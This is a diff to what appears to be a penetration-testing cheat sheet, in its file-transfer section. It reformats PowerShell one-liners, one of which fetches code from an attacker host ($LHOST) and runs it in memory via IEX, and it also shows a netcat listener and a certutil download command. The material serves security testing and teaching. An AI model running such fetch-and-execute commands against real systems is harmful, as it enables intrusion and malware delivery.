@@ -170,10 +170,9 @@ To get file
 nc -lp 8888 > outfile
 ```
 ### Windows Powershell
-```diff
-- powershell (New-Object Net.WebClient).DownloadFile('$LHOST/file', 'outfile') <- download to disk: need double check
-- powershell "IEX(New-Object Net.WebClient).downloadString('$LHOST/file')" <- download and exec on memory
-```
+```powershell (New-Object Net.WebClient).DownloadFile('$LHOST/file', 'outfile')``` <- download file to disk
+```powershell "IEX(New-Object Net.WebClient).downloadString('$LHOST/file')"``` <- download and exec on memory
+
 ### Certutil
 ```
 certutil.exe -urlcache -split -f "$RHOST" outfile.zip
